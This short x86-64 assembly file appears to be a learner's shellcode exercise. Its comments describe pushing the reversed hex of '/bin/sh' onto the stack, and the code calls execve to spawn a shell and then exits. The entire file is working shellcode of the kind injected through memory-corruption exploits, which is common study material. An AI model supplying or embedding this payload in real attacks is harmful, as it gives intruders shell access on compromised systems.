;stack_technique_to_spwan_a_shell
;we have put whole hex coversion of /bin/sh in reverse
;beacause 64bit register can filled with it
global _start


_start:

	push 59
	pop rax
	xor rdi, rdi
	push rdi
	mov rdi,  0x68732f6e69622f
	push rdi
	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	syscall
	
	xor rax, rax
	mov al, 60
	xor rdi,rdi
	syscall

	
	
